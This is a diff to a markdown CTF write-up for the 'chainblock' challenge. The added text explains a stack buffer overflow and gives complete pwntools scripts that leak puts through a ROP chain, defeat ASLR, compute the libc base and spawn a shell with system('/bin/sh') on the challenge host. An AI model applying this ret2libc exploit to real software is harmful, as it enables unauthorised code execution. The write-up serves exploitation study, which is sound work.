@@ -78,7 +78,7 @@ int main() {
 
 First of all we check what for file it is:
 
-<img src="Images/file.png" width="500" >
+<img src="Images/file.png" width="800" >
 
 We can see its an 64 bit executable. 
 
@@ -91,7 +91,7 @@ It takes 255 chars in the buffer and gets() keeps on reading until it sees a new
 	gets(buf);
 ```
 
-Now with an buffer overflow, we are normally using shellcode to ececute something on the stack but for this challenge as we can read here:
+Now with an buffer overflow, we are normally using shellcode to ececute something on the stack but for this challenge as we can read from binary:
 ```
 "We use advanced technologies like NX bits and anti-hacking machine learning model"
 ```
@@ -108,10 +108,14 @@ So we can't execute something on the stack. So what we need to do is ret2libc(re
 
 ## Exploit
 
+### Offset
+
 First of all we need to find the offset of the buffer overflow:
+
 I will do this in gdb:
 
 Create the pattern:
+
 <img src="Images/pattern.png" width="800" >
 
 Run the program and enter you pattern:
@@ -124,3 +128,167 @@ Now we can check the offset:
 
 We found the offset at 264.
 
+### libc base addres
+
+Now we found the offset, we need to find the libc base address, so that we can use system("/bin/sh") from the libc.
+To find the address, we can do:
+
+<img src="Images/ldd.png" width="500" >
+
+But as we can see here ASLR is enabled, so the address changing every time:
+
+<img src="Images/ldd1.png" width="500" >
+
+ASLR is:
+```
+Address space layout randomization is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities.
+```
+So now we need to leak a function to calculte the base address, we need to do this because of ASLR. 
+
+A nice article how to bypass ASLR with pwntools:
+
+https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools
+
+So to bypass I first got the address of main, I use the main address, because ASLR randomizes the addresses when the program get executed. 
+So if we call main, it jumps back to the start of the program and run it without re-randomization.
+
+To get the address of main:
+```
+gdb ./chainblock
+disas main and take the first addresss 
+or you can do: b *main and take the addresss
+```
+Now we need to leak a function. I leaked the puts() function.
+First we need the `puts@GOT` addresss:
+
+<img src="Images/got.png" width="500" >
+
+then `puts@plt`:
+
+<img src="Images/plt.png" width="500" >
+
+For more information why plt and got, check the article above.
+ 
+Now because this is an 64 bit executable, we need to use a ROP gadget.
+In 64-bit binaries, function parameters are passed in registers.
+The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9.
+The calling convention states that the first parameter of a method must be placed in the RDI register.
+So we need to find `POP RDI; RET` gadget. We can find gadgets with `ROPgadget`:
+
+```
+ROPgadget --binary chainblock
+```
+we find:
+```
+0x0000000000401493 : pop rdi ; ret
+```
+So now we can make the exploit to leak the libc address:
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+p = process('./chainblock')
+p.recvuntil('name: ')
+
+main_addresss = 0x40124b
+puts_got_address = 0x404018
+puts_plt_addresss = 0x401080
+pop_rdi = 0x401493
+
+payload = b'A' * 264 
+payload += p64(pop_rdi) 
+payload += p64(puts_got_address) 
+payload += p64(puts_plt_addresss) 
+payload += p64(main_addresss)
+
+print(p.sendline(payload))
+print(p.recvline())
+
+leaked_output = p.recvline()
+leaked_output = leaked_output[:-1]
+print('leaked puts() addresss', leaked_output)
+```
+And we leaked the puts() address. Now we can calculate the base address:
+
+```py
+puts = u64((leaked_output + b"\x00\x00")[:8])
+libc_addresss = puts - libc.symbols['puts']
+print("libc_addresss: ", hex(libc_addresss))
+```
+We add 2 bytes because unpack requires 8 bytes. We set a limit of 8 with [:8].
+So now we have the base address, we can exploit it to get a shell.
+
+### Get shell
+
+Now we will find the address of system and /bin/sh:
+
+<img src="Images/system.png" width="1000" >
+
+<img src="Images/binsh.png" width="1000" >
+
+So now we got the addresses, we need to add this to the base address of libc to get the exact location.
+Now we have almost everything. I need an extra ROP gadget, because of stack alignment. 
+I added the `ret` gadget:
+```
+0x000000000040101a : ret
+```
+So our final script(flag.py) will be like this:
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+local = False
+elf = ELF('./chainblock')
+
+if local:  
+    p = elf.process()
+    libc = ELF('./libc.so.6')
+else:
+    host = 'pwn.be.ax'
+    port = 5000
+    p = remote(host, port)
+    libc = ELF('./libc.so.6')
+
+p.recvuntil('name: ')
+
+main_adress = 0x40124b
+puts_got_address = 0x404018
+puts_plt_adress = 0x401080
+pop_rdi = 0x401493
+
+payload = b'A' * 264 
+payload += p64(pop_rdi) 
+payload += p64(puts_got_address) 
+payload += p64(puts_plt_adress) 
+payload += p64(main_adress)
+
+print(p.sendline(payload))
+print(p.recvline())
+leaked_output = p.recvline()[:-1]
+print('leaked puts() adress: ', leaked_output)
+
+puts = u64((leaked_output + b"\x00\x00"))
+libc_adress = puts - libc.symbols['puts']
+print("libc_adress: ", hex(libc_adress))
+
+system = libc_adress + 0x04fa60
+bin_sh = libc_adress + 0x1abf05
+pop_rdi = 0x401493
+ret = 0x40101a
+
+payload = b'A' * 264 
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(ret)
+payload += p64(system)
+
+p.clean()
+p.sendline(payload)
+p.interactive()
+```
+
+Now we can get the flag:
+
+<img src="Images/flag.png" width="800" >
